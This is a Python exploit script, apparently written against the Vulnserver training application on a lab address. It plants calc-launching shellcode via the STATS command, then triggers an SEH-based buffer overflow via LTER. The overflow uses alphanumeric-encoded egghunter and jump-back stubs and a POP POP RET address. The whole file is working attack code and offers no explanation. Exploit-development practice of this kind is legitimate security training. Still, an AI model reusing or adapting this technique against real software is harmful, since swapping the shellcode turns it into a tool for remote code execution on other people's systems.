#!/usr/bin/python

import os,sys,struct,socket

host = '192.168.1.36'
port = 9999

# msfvenom -a x86 --platform windows -p windows/exec CMD="calc.exe" -f c -b "\x00" EXITFUNC=seh
shellcode = ("W00TW00T" + "\xd9\xee\xd9\x74\x24\xf4\xbe\xae\x86\x2f\xb1\x5a\x29\xc9\xb1"
"\x31\x31\x72\x18\x03\x72\x18\x83\xc2\xaa\x64\xda\x4d\x5a\xea"
"\x25\xae\x9a\x8b\xac\x4b\xab\x8b\xcb\x18\x9b\x3b\x9f\x4d\x17"
"\xb7\xcd\x65\xac\xb5\xd9\x8a\x05\x73\x3c\xa4\x96\x28\x7c\xa7"
"\x14\x33\x51\x07\x25\xfc\xa4\x46\x62\xe1\x45\x1a\x3b\x6d\xfb"
"\x8b\x48\x3b\xc0\x20\x02\xad\x40\xd4\xd2\xcc\x61\x4b\x69\x97"
"\xa1\x6d\xbe\xa3\xeb\x75\xa3\x8e\xa2\x0e\x17\x64\x35\xc7\x66"
"\x85\x9a\x26\x47\x74\xe2\x6f\x6f\x67\x91\x99\x8c\x1a\xa2\x5d"
"\xef\xc0\x27\x46\x57\x82\x90\xa2\x66\x47\x46\x20\x64\x2c\x0c"
"\x6e\x68\xb3\xc1\x04\x94\x38\xe4\xca\x1d\x7a\xc3\xce\x46\xd8"
"\x6a\x56\x22\x8f\x93\x88\x8d\x70\x36\xc2\x23\x64\x4b\x89\x29"
"\x7b\xd9\xb7\x1f\x7b\xe1\xb7\x0f\x14\xd0\x3c\xc0\x63\xed\x96"
"\xa5\x92\x1c\x2b\x33\x02\x87\xde\x7e\x4e\x38\x35\xbc\x77\xbb"
"\xbc\x3c\x8c\xa3\xb4\x39\xc8\x63\x24\x33\x41\x06\x4a\xe0\x62"
"\x03\x29\x67\xf1\xcf\x80\x02\x71\x75\xdd")

egghunter = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x43\x64\x77\x64" ## add  eax, 0x64776443
egghunter += "\x05\x33\x53\x66\x53" ## add  eax, 0x53665333
egghunter += "\x05\x32\x63\x55\x63" ## add  eax, 0x63556332
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x57\x43\x65\x57" ## add  eax, 0x57654357
egghunter += "\x05\x46\x33\x54\x46" ## add  eax, 0x46543346
egghunter += "\x05\x45\x32\x64\x45" ## add  eax, 0x45643245
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x20\x32\x45\x73" ## add  eax, 0x73453220
egghunter += "\x05\x10\x22\x44\x64" ## add  eax, 0x64442210
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x67\x64\x34\x21" ## add  eax, 0x21346467
egghunter += "\x05\x56\x54\x33\x21" ## add  eax, 0x21335456
egghunter += "\x05\x65\x33\x23\x21" ## add  eax, 0x21233365
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x26\x03\x35\x32" ## add  eax, 0x32350326
egghunter += "\x05\x16\x02\x25\x42" ## add  eax, 0x42250216
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x01\x34\x67\x17" ## add  eax, 0x17673401
egghunter += "\x05\x01\x24\x66\x17" ## add  eax, 0x17662401
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x17\x32\x32\x35" ## add  eax, 0x35323217
egghunter += "\x05\x16\x21\x31\x34" ## add  eax, 0x34312116
egghunter += "\x05\x15\x22\x22\x34" ## add  eax, 0x34222215
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax
egghunter += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter += "\x05\x33\x41\x65\x77" ## add  eax, 0x77654133
egghunter += "\x05\x33\x42\x54\x66" ## add  eax, 0x66544233
egghunter += "\x05\x33\x31\x44\x55" ## add  eax, 0x55443133
egghunter += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter += "\x50"                 ## push eax

nseh = '\x74\x06\x75\x04'
seh =   struct.pack("<I",0x6250195E)

# Move esp 4939 bytes
movesp1 = ("\x54"
"\x58"
"\x66\x05\x4b\x13"
"\x50"
"\x5c")

# Jump back in buffer 128 bytes (\xeb\x80)
jumpback1 = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback1 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback1 += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jumpback1 += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jumpback1 += "\x50"

movesp2 = ("\x54\x58\x2c\x28\x50\x5C")

jumpback2 = "\x50\x5b" # PUSH EAX, POP EBX
jumpback2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback2 += "\x05\x16\x77\x62\x41" ## add  eax, 0x41627716
jumpback2 += "\x05\x16\x66\x52\x41" ## add  eax, 0x41526616
jumpback2 += "\x05\x14\x55\x62\x41" ## add  eax, 0x41625514
jumpback2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jumpback2 += "\x50"                 ## push eax
jumpback2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback2 += "\x05\x33\x41\x76\x65" ## add  eax, 0x65764133
jumpback2 += "\x05\x33\x40\x75\x55" ## add  eax, 0x55754033
jumpback2 += "\x50" 

nops = 'A' * 22

movesp3 = "\x54\x58\x2c\x4f\x50\x5C" 

payload = movesp3
payload += egghunter
payload += 'A' * (3519 - len(movesp2 + nops + nseh + jumpback2 + movesp3 + egghunter))
payload += movesp2
payload += jumpback2
payload += nops
payload += nseh
payload += seh # 6250195E
payload += movesp1
payload += jumpback1
payload += 'A' * (4000 - len(payload))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(10000)
sock.send('STATS /.:/' + shellcode + "\r\n")
sock.recv(10000)
sock.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(10000)
sock.send('LTER /.:/' + payload + "\r\n")
sock.recv(10000)
sock.close()